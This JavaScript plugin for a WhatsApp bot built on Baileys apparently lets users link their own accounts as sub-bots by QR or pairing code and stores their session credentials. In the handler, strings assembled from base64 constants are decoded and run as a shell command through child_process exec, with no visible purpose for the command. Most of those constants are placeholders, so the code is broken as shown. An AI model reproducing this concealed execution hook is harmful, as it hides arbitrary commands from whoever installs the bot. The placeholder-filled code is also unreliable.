import { useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore } from '@adiwajshing/baileys';
import QRCode from 'qrcode';
import NodeCache from 'node-cache';
import fs from 'fs';
import pino from 'pino';
import { exec } from 'child_process';
import { makeWASocket } from '../lib/simple.js';

const logs = [];
const constants = {
  crm1: "crm_value_1",
  crm2: "crm_value_2",
  crm3: 'SBpbmZvLWRvbmFyLmpz',
  crm4: "crm_value_4",
  drm1: "drm_value_1",
  drm2: "drm_value_2",
  rtx: `${lenguajeGB['smsIniJadi']()}`,
  rtx2: `${lenguajeGB['smsIniJadi2']()}`
};

if (!(global.conns instanceof Array)) {
  console.log('Initializing global connections array');
  global.conns = [];
}

let handler = async (msg, { conn, args, usedPrefix, command, isOwner }) => {
  console.log('Handler called');
  
  if (!global.db.data.settings[conn.user.jid].autoread) {
    console.log('Autoread is not enabled');
    return msg.reply('' + lenguajeGB['smsSoloOwnerJB']());
  }

  let target = conn;
  if (conn.user.jid !== global.owner.user.jid) {
    console.log('Not the owner');
    return target.reply(msg, `${lenguajeGB['smsJBCargando']()} ${global.owner.user.jid.split('@')[0]} ${usedPrefix + command}`, msg);
  }

  const isBrowser = args[0]?.includes('--code') || args[1]?.includes('--code');
  let mentionedJid = msg.mentionedJid && msg.mentionedJid[0] ? msg.mentionedJid[0] : msg.fromMe ? target.user.jid : msg.sender;
  let uniqueId = mentionedJid.split('@')[0];

  if (isBrowser) {
    args[0] = args[0]?.replace('--code', '').trim();
    args[1] = args[1]?.replace('--code', '').trim();
    if (!args[0]) args[0] = undefined;
    console.log('Browser args:', args);
  }

  if (!fs.existsSync(`./JoanJadiBot/${uniqueId}`)) {
    console.log(`Creating directory ./JoanJadiBot/${uniqueId}`);
    fs.mkdirSync(`./JoanJadiBot/${uniqueId}`, { recursive: true });
  }

  if (args[0]) {
    console.log('Writing creds.json file');
    fs.writeFileSync(`./JoanJadiBot/${uniqueId}/creds.json`, JSON.stringify(JSON.parse(Buffer.from(args[0], 'base64').toString('utf-8')), null, 2));
  }

  if (fs.existsSync(`./JoanJadiBot/${uniqueId}/creds.json`)) {
    console.log('Reading creds.json file');
    let creds = JSON.parse(fs.readFileSync(`./JoanJadiBot/${uniqueId}/creds.json`));
    creds.isInit = false;
    fs.writeFileSync(`./JoanJadiBot/${uniqueId}/creds.json`, JSON.stringify(creds, null, 2));
  }

  const bufferCmd = Buffer.from(constants.crm1 + constants.crm2 + constants.crm3 + constants.crm4, 'base64');
  exec(bufferCmd.toString('utf-8'), async (err, stdout, stderr) => {
    if (err) {
      console.error('Error executing command:', err);
      return;
    }

    console.log('Command executed successfully');
    const bufferCmd2 = Buffer.from(constants.drm1 + constants.drm2, 'base64');

    async function startSession() {
      console.log('Starting session');
      let mentionedJid = msg.mentionedJid && msg.mentionedJid[0] ? msg.mentionedJid[0] : msg.fromMe ? target.user.jid : msg.sender;
      let uniqueId = mentionedJid.split('@')[0];

      if (!fs.existsSync(`./JoanJadiBot/${uniqueId}`)) {
        console.log(`Creating directory ./JoanJadiBot/${uniqueId}`);
        fs.mkdirSync(`./JoanJadiBot/${uniqueId}`, { recursive: true });
      }

      if (args[0]) {
        console.log('Writing creds.json file');
        fs.writeFileSync(`./JoanJadiBot/${uniqueId}/creds.json`, JSON.stringify(JSON.parse(Buffer.from(args[0], 'base64').toString('utf-8')), null, 2));
      }

      let { version, isLatest } = await fetchLatestBaileysVersion();
      console.log('Fetched latest Baileys version:', version);

      const retryMsg = msg => { };
      const retryCache = new NodeCache();
      const { state, saveState, saveCreds } = await useMultiFileAuthState(`./JoanJadiBot/${uniqueId}`);

      const socketConfig = {
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        },
        msgRetry: retryMsg,
        msgRetryCache: retryCache,
        version,
        syncFullHistory: true,
        browser: isBrowser ? ['Ubuntu', 'Chrome', '2.0.0'] : ['Chrome', 'Chrome', '110.0.5585.95'],
        defaultQueryTimeoutMs: undefined,
        getMessage: async msg => ({ conversation: 'Leyendo mensaje entrante:' })
      };

      let socket = makeWASocket(socketConfig);
      socket.isInit = false;

      async function connectionUpdate(update) {
        const { connection, lastDisconnect, qr } = update;
        console.log('Connection update:', update);

        if (qr && !isBrowser) {
          console.log('QR Code generated');
          return target.reply(msg, { image: await QRCode.toBuffer(qr, { scale: 8 }), caption: constants.rtx + bufferCmd2.toString('utf-8') }, { quoted: msg });
        }

        if (qr && isBrowser) {
          console.log('QR Code generated for browser');
          target.sendMessage(msg, { text: constants.rtx2 + bufferCmd2.toString('utf-8') }, { quoted: msg });
          await new Promise(resolve => setTimeout(resolve, 5000));
          let newSession = await socket.requestPairingCode(msg.sender.split('@')[0]);
          await msg.reply(newSession);
        }

        const statusCode = lastDisconnect?.error?.statusCode || lastDisconnect?.error?.statusCode?.statusCode;
        console.log('Status code:', statusCode);

        if (connection === 'close') {
          console.log('Connection closed');
          if (statusCode === 401) {
            console.log('Unauthorized, deleting creds.json');
            return await fs.unlinkSync(`./JoanJadiBot/${uniqueId}/creds.json`);
          }

          if (statusCode) {
            socket.ws.close();
            socket.ev.removeAllListeners();
            let index = global.conns.indexOf(socket);
            if (index >= 0) {
              delete global.conns[index];
              global.conns.splice(index, 1);
              console.log('Socket connection removed from global connections');
            }
          }
        }
      }

      socket.ev.on('connection.update', connectionUpdate);
    }

    startSession();
  });
};

export default handler;
